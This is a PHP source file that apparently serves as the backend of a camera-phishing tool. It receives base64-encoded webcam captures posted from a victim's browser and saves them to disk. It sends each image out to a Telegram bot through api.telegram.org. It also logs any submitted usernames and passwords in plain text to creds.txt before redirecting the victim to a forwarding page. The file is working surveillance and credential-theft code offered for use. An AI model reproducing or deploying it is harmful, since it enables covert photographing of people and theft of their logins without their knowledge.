<?php
// ============================================
// POST.PHP - Handles camera captures
// ============================================

$date = date('dMYHis');
$imageData = $_POST['cat'];

// Log received data
if (!empty($_POST['cat'])) {
    error_log("Received at " . date('Y-m-d H:i:s') . "\r\n", 3, "Log.log");
}

// Create date-based folder
$folderName = date('Y-m-d');
if (!file_exists($folderName)) {
    mkdir($folderName, 0777, true);
}

// Save image
$filteredData = substr($imageData, strpos($imageData, ",") + 1);
$unencodedData = base64_decode($filteredData);
$filePath = $folderName . '/cam' . $date . '.png';
$fp = fopen($filePath, 'wb');
fwrite($fp, $unencodedData);
fclose($fp);

// Send to Telegram
sendToTelegram($filePath, $unencodedData);

// Log credentials (if POSTed)
if (isset($_POST['username']) && isset($_POST['password'])) {
    $creds = date('Y-m-d H:i:s') . " | User: " . $_POST['username'] . " | Pass: " . $_POST['password'] . "\n";
    file_put_contents('creds.txt', $creds, FILE_APPEND);
}

// Redirect after processing
header('Location: forwarding_link/index2.html');
exit();

// ============================================
// TELEGRAM FUNCTIONS
// ============================================

function sendToTelegram($filePath, $unencodedData) {
    $telegram_token = '';
    $telegram_chat = '';
    $config_file = 'telegram_config.json';
    
    if (file_exists($config_file)) {
        $config = json_decode(file_get_contents($config_file), true);
        if ($config && isset($config['bot_token']) && isset($config['chat_id'])) {
            $telegram_token = $config['bot_token'];
            $telegram_chat = $config['chat_id'];
        }
    }
    
    if (!empty($telegram_token) && !empty($telegram_chat)) {
        $caption = "📸 *Camera Capture*\n\n⏰ Time: " . date('Y-m-d H:i:s');
        $url = "https://api.telegram.org/bot" . $telegram_token . "/sendPhoto";
        
        if (function_exists('curl_file_create')) {
            // cURL method
            $cfile = curl_file_create($filePath, 'image/png', basename($filePath));
            $data = array(
                'chat_id' => $telegram_chat,
                'photo' => $cfile,
                'caption' => $caption,
                'parse_mode' => 'Markdown'
            );
            
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_TIMEOUT, 10);
            $result = curl_exec($ch);
            $error = curl_error($ch);
            curl_close($ch);
            
            if ($error) {
                error_log("Telegram cURL error: " . $error, 3, "telegram_error.log");
            }
        } else {
            // Fallback method
            $boundary = uniqid();
            $delimiter = '-------------' . $boundary;
            
            $postData = '';
            $postData .= "--" . $delimiter . "\r\n";
            $postData .= 'Content-Disposition: form-data; name="chat_id"' . "\r\n\r\n";
            $postData .= $telegram_chat . "\r\n";
            
            $postData .= "--" . $delimiter . "\r\n";
            $postData .= 'Content-Disposition: form-data; name="photo"; filename="' . basename($filePath) . '"' . "\r\n";
            $postData .= 'Content-Type: image/png' . "\r\n\r\n";
            $postData .= $unencodedData . "\r\n";
            
            $postData .= "--" . $delimiter . "\r\n";
            $postData .= 'Content-Disposition: form-data; name="caption"' . "\r\n\r\n";
            $postData .= $caption . "\r\n";
            $postData .= "--" . $delimiter . "--\r\n";
            
            $options = array(
                'http' => array(
                    'method' => 'POST',
                    'header' => 'Content-Type: multipart/form-data; boundary=' . $delimiter,
                    'content' => $postData,
                    'timeout' => 10,
                    'ignore_errors' => true
                )
            );
            
            $context = stream_context_create($options);
            $result = @file_get_contents($url, false, $context);
        }
    }
}
?>
